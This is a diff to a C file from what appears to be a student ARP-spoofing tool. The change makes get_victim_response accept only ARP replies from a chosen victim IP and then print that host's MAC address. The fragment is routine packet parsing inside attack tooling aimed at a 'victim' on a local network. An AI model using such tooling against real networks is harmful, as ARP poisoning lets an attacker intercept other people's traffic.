@@ -5,7 +5,7 @@
 ** Login   <janel@epitech.net>
 **
 ** Started on  Thu Feb 23 15:22:01 2017 Janel
-** Last update Sun Oct 22 23:16:54 2017 
+** Last update Fri Mar 23 18:54:14 2018 
 */
 
 #include <stdio.h>
@@ -49,12 +49,13 @@ char			send_packet_to_broadcast(const int sd,
 }
 
 
-uint8_t				*get_victim_response(const int sd)
+uint8_t				*get_victim_response(const int sd, const char *victim_ip)
 {
   char				buffer[IP_MAXPACKET];
   t_ethernet_packet		*ethernet_packet;
   t_arp_packet			*arp_packet;
   uint8_t			*victim_mac_address;
+  char				uint8_t_to_str[INET_ADDRSTRLEN] = {0};
 
   if (!(victim_mac_address = malloc(sizeof(uint8_t) * HARDWARE_LENGTH)))
     return (NULL);
@@ -69,9 +70,14 @@ uint8_t				*get_victim_response(const int sd)
 	continue ;
 
       arp_packet = (t_arp_packet *)(buffer + ETH_HEADER_LENGTH);
-      if (ntohs(arp_packet->opcode) != ARPOP_REPLY)
-	continue ;
 
+      if (ntohs(arp_packet->opcode) != ARPOP_REPLY
+	  || (arp_packet->sender_ip && !inet_ntop(AF_INET, arp_packet->sender_ip, uint8_t_to_str, INET_ADDRSTRLEN))
+	  || strcmp(uint8_t_to_str, victim_ip))
+	{
+	  memset(uint8_t_to_str, 0, INET_ADDRSTRLEN);
+	  continue ;
+	}
       fprintf(stdout, "[+] Got response from victim\n");
       fprintf(stdout, "[*] Sender mac address: ");
       PRINT_MAC_ADDRESS(arp_packet->sender_mac);
